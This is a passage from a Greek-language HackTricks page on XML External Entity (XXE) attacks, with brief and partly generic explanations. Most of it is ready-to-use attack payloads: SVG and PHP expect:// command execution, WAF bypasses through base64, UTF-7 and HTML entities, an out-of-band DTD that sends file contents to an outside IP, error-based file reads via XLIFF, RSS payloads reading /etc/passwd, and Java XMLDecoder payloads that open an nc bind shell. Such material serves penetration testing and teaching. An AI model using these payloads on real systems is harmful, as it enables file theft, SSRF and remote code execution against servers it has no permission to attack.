Μια άλλη μέθοδος περιλαμβάνει την προσπάθεια εκτέλεσης εντολών μέσω του περιτυλίγματος "expect" της PHP:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Σε και τις δύο περιπτώσεις, η μορφή SVG χρησιμοποιείται για να εκτελέσει επιθέσεις που εκμεταλλεύονται τις δυνατότητες επεξεργασίας XML του λογισμικού του διακομιστή, υπογραμμίζοντας την ανάγκη για αξιόπιστο έλεγχο εισόδου και μέτρα ασφαλείας.

Ελέγξτε [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) για περισσότερες πληροφορίες!

**Σημείωση: Η πρώτη γραμμή του αρχείου ανάγνωσης ή του αποτελέσματος της εκτέλεσης θα εμφανίζεται ΜΕΣΑ στη δημιουργημένη εικόνα SVG. Επομένως, πρέπει να μπορείτε να έχετε πρόσβαση στην εικόνα που δημιουργήθηκε από το SVG.**

### **PDF - Μεταφόρτωση αρχείου**

Διαβάστε την παρακάτω ανάρτηση για να **μάθετε πώς να εκμεταλλευτείτε ένα XXE με μεταφόρτωση ενός αρχείου PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Από x-www-urlencoded σε XML

Εάν ένα αίτημα POST δέχεται τα δεδομένα σε μορφή XML, μπορείτε να δοκιμάσετε να εκμεταλλευτείτε ένα XXE σε αυτό το αίτημα. Για παράδειγμα, αν ένα κανονικό αίτημα περιέχει τα εξής:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Τότε μπορείς να υποβάλεις το ακόλουθο αίτημα, με τον ίδιο αποτέλεσμα:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Από JSON σε XEE

Για να αλλάξετε το αίτημα, μπορείτε να χρησιμοποιήσετε μια επέκταση του Burp με το όνομα "**Content Type Converter**". [Εδώ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) μπορείτε να βρείτε αυτό το παράδειγμα:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Ένα άλλο παράδειγμα μπορεί να βρεθεί [εδώ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Παράκαμψη WAF και προστασίες

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Αυτό λειτουργεί μόνο εάν ο XML διακομιστής αποδέχεται το πρωτόκολλο `data://`.

### UTF-7

Μπορείτε να χρησιμοποιήσετε την \[**"Συνταγή Κωδικοποίησης**" του cyberchef εδώ ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) μετατροπή σε UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Παράκαμψη πρωτοκόλλου File:/

Αν η ιστοσελίδα χρησιμοποιεί PHP, αντί να χρησιμοποιήσετε `file:/`, μπορείτε να χρησιμοποιήσετε τα **php wrappers** `php://filter/convert.base64-encode/resource=` για να **έχετε πρόσβαση σε εσωτερικά αρχεία**.

Αν η ιστοσελίδα χρησιμοποιεί Java, μπορείτε να ελέγξετε το [**πρωτόκολλο jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Κόλπο από το [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Μπορείτε να δημιουργήσετε μια **οντότητα μέσα σε μια οντότητα** κωδικοποιώντας τη με **html entities** και στη συνέχεια να την καλέσετε για να **φορτώσετε ένα dtd**.\
Σημειώστε ότι οι **HTML Entities** που χρησιμοποιούνται πρέπει να είναι **αριθμητικές** (όπως \[σε αυτό το παράδειγμα]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Παράδειγμα DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Αναγνωριστικά PHP

### Base64

**Εξαγωγή** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Εξαγωγή εξωτερικού πόρου**

An XML External Entity (XXE) attack is a type of vulnerability that allows an attacker to extract data from the server or perform other malicious actions by exploiting the way XML parsers process external entities. This attack can be used to read files, perform SSRF attacks, and even execute arbitrary code on the server.

To perform an XXE attack, the attacker needs to find a vulnerable XML parser that allows the inclusion of external entities. The attacker can then craft a malicious XML payload that includes an external entity pointing to a file or a URL they want to extract data from.

Here is an example of a vulnerable XML document:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

In this example, the `xxe` entity is defined to include the contents of the `/etc/passwd` file. When the XML parser processes the `data` element, it resolves the `xxe` entity and includes the contents of the specified file.

To protect against XXE attacks, it is important to disable the inclusion of external entities in XML parsers or properly sanitize user input before parsing it as XML.
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Απομακρυσμένη εκτέλεση κώδικα

**Εάν το PHP "expect" module είναι φορτωμένο**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

Η επίθεση XML External Entity (XEE) είναι μια ευπάθεια που εκμεταλλεύεται τη δυνατότητα των XML parsers να αναφέρονται σε εξωτερικές οντότητες. Αυτή η επίθεση μπορεί να χρησιμοποιηθεί για να διαβάσει ευαίσθητα αρχεία από τον διακομιστή ή ακόμα και για να εκτελέσει απομακρυσμένο κώδικα.

Για να εκτελέσετε μια επίθεση XEE, πρέπει να εντοπίσετε μια εφαρμογή που χρησιμοποιεί το πρωτόκολλο SOAP για την επικοινωνία με τον διακομιστή. Στη συνέχεια, πρέπει να εντοπίσετε ένα σημείο εισόδου όπου μπορείτε να εισάγετε XML δεδομένα.

Για να εκμεταλλευτείτε την ευπάθεια XEE, μπορείτε να δημιουργήσετε ένα ειδικά σχεδιασμένο XML payload που περιέχει μια εξωτερική οντότητα που αναφέρεται σε ένα ευαίσθητο αρχείο. Όταν η εφαρμογή αναλύει το XML, η εξωτερική οντότητα θα αναφερθεί στο αρχείο και θα επιστρέψει τα περιεχόμενά του.

Με την επιτυχή εκτέλεση της επίθεσης XEE, μπορείτε να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες, όπως διαπιστευτήρια χρηστών, κωδικούς πρόσβασης ή ακόμα και να εκτελέσετε κακόβουλο κώδικα στον διακομιστή.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Αυτό το παράδειγμα είναι εμπνευσμένο από το [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

Το XLIFF (XML Localization Interchange File Format) χρησιμοποιείται για την τυποποίηση της ανταλλαγής δεδομένων στις διαδικασίες τοπικοποίησης. Είναι ένα βασισμένο σε XML μορφότυπο που χρησιμοποιείται κυρίως για τη μεταφορά δεδομένων που μπορούν να τοπικοποιηθούν μεταξύ εργαλείων κατά τη διάρκεια της τοπικοποίησης και ως ένα κοινό μορφότυπο ανταλλαγής για εργαλεία CAT (Computer-Aided Translation).

### Ανάλυση Τυφλού Αιτήματος

Γίνεται ένα αίτημα στον διακομιστή με τον παρακάτω περιεχόμενο:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ωστόσο, αυτό το αίτημα προκαλεί ένα εσωτερικό σφάλμα του διακομιστή, αναφέροντας συγκεκριμένα ένα πρόβλημα με τις δηλώσεις σήμανσης:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Παρά το σφάλμα, καταγράφεται ένα χτύπημα στο Burp Collaborator, που υποδηλώνει κάποιο επίπεδο αλληλεπίδρασης με την εξωτερική οντότητα.

Εξαγωγή Δεδομένων Εκτός Ζώνης
Για να εξαγάγουμε δεδομένα, στέλνεται ένας τροποποιημένος αίτημα:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Αυτή η προσέγγιση αποκαλύπτει ότι ο User Agent υποδεικνύει τη χρήση του Java 1.8. Ένα περιορισμένο σημείο αυτής της έκδοσης της Java είναι η αδυναμία ανάκτησης αρχείων που περιέχουν χαρακτήρα νέας γραμμής, όπως το /etc/passwd, χρησιμοποιώντας την τεχνική Out of Band.

Εξαγωγή Δεδομένων με Βάση το Σφάλμα
Για να ξεπεραστεί αυτός ο περιορισμός, χρησιμοποιείται μια προσέγγιση βασισμένη σε σφάλματα. Το αρχείο DTD έχει την ακόλουθη δομή για να προκαλέσει ένα σφάλμα που περιλαμβάνει δεδομένα από ένα στοχευμένο αρχείο:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Ο διακομιστής απαντά με ένα σφάλμα, αναφέροντας σημαντικά το μη υπαρκτό αρχείο, υποδεικνύοντας ότι ο διακομιστής προσπαθεί να αποκτήσει πρόσβαση στο συγκεκριμένο αρχείο:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Για να συμπεριληφθεί το περιεχόμενο του αρχείου στο μήνυμα σφάλματος, το αρχείο DTD προσαρμόζεται:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Αυτή η τροποποίηση οδηγεί στην επιτυχή εξαγωγή του περιεχομένου του αρχείου, καθώς αυτό αντανακλάται στην έξοδο σφάλματος που αποστέλλεται μέσω HTTP. Αυτό υποδηλώνει μια επιτυχημένη επίθεση XXE (XML External Entity), εκμεταλλευόμενη τεχνικές Out of Band και Error-Based για την εξαγωγή ευαίσθητων πληροφοριών.


## RSS - XEE

Έγκυρο XML με μορφή RSS για εκμετάλλευση ευπάθειας XXE.

### Επιστροφή ανταπόκρισης

Απλή αίτηση HTTP προς τον διακομιστή των επιτιθέμενων.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Διάβασμα αρχείου

Η επίθεση XML External Entity (XXE) εκμεταλλεύεται την αδυναμία επεξεργασίας εξωτερικών οντοτήτων XML από τον εξυπηρετητή. Με αυτήν την επίθεση, μπορείτε να διαβάσετε αρχεία από το σύστημα αρχείων του εξυπηρετητή.

Για να εκτελέσετε αυτήν την επίθεση, πρέπει να δημιουργήσετε ένα XML αίτημα που περιέχει μια εξωτερική οντότητα που αναφέρεται σε ένα αρχείο που θέλετε να διαβάσετε. Ο εξυπηρετητής θα προσπαθήσει να επεξεργαστεί την οντότητα και, αν επιτύχει, θα επιστρέψει το περιεχόμενο του αρχείου.

Για να προστατευθείτε από αυτήν την επίθεση, μπορείτε να απενεργοποιήσετε την επεξεργασία εξωτερικών οντοτήτων XML στις ρυθμίσεις του εξυπηρετητή. Επίσης, πρέπει να επιβεβαιώνετε την εγκυρότητα των εισερχόμενων δεδομένων και να περιορίζετε την πρόσβαση σε ευαίσθητα αρχεία.

Παρακάτω παρουσιάζεται ένα παράδειγμα XML αιτήματος που εκμεταλλεύεται την επίθεση XXE για να διαβάσει ένα αρχείο `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Αν ο εξυπηρετητής είναι ευάλωτος σε αυτήν την επίθεση, θα επιστραφεί το περιεχόμενο του αρχείου `/etc/passwd`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Διάβασμα πηγαίου κώδικα

Χρησιμοποιώντας το PHP φίλτρο base64
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Εκτέλεση Κώδικα Java XMLDecoder XEE σε RCE

Το XMLDecoder είναι μια κλάση Java που δημιουργεί αντικείμενα βασισμένα σε ένα μήνυμα XML. Αν ένας κακόβουλος χρήστης μπορεί να πείσει μια εφαρμογή να χρησιμοποιήσει αυθαίρετα δεδομένα σε μια κλήση της μεθόδου **readObject**, τότε θα αποκτήσει αμέσως εκτέλεση κώδικα στον διακομιστή.

### Χρήση της Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

Ο `ProcessBuilder` είναι μια κλάση στην Java που χρησιμοποιείται για τη δημιουργία και εκτέλεση νέων διεργασιών. Μπορεί να χρησιμοποιηθεί για να εκτελέσει εξωτερικές εντολές στο λειτουργικό σύστημα από μια εφαρμογή Java.

Για να χρησιμοποιήσετε το `ProcessBuilder`, πρέπει να δημιουργήσετε ένα αντικείμενο της κλάσης και να ορίσετε την εντολή που θέλετε να εκτελέσετε. Μπορείτε επίσης να ορίσετε οποιεσδήποτε παραμέτρους ή περιβαλλοντικές μεταβλητές που απαιτούνται για την εκτέλεση της εντολής.

Αφού ορίσετε την εντολή και τις παραμέτρους, μπορείτε να εκτελέσετε τη διεργασία καλώντας τη μέθοδο `start()` του αντικειμένου `ProcessBuilder`. Αυτό θα δημιουργήσει μια νέα διεργασία και θα την εκτελέσει.

Μπορείτε επίσης να ανακτήσετε την έξοδο της διεργασίας καλώντας τη μέθοδο `getInputStream()` του αντικειμένου `ProcessBuilder`. Αυτό θα επιστρέψει ένα `InputStream` που μπορείτε να χρησιμοποιήσετε για να διαβάσετε την έξοδο της διεργασίας.

Ο `ProcessBuilder` είναι ένα χρήσιμο εργαλείο για την εκτέλεση εξωτερικών εντολών από μια εφαρμογή Java. Ωστόσο, πρέπει να ληφθούν υπόψη οι πιθανοί κίνδυνοι ασφάλειας και να εφαρμοστούν κατάλληλα μέτρα προστασίας για να αποτραπεί η κακόβουλη χρήση του.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Εργαλεία

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Αναφορές

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Εξαγωγή πληροφοριών μέσω HTTP χρησιμοποιώντας το δικό μας εξωτερικό DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
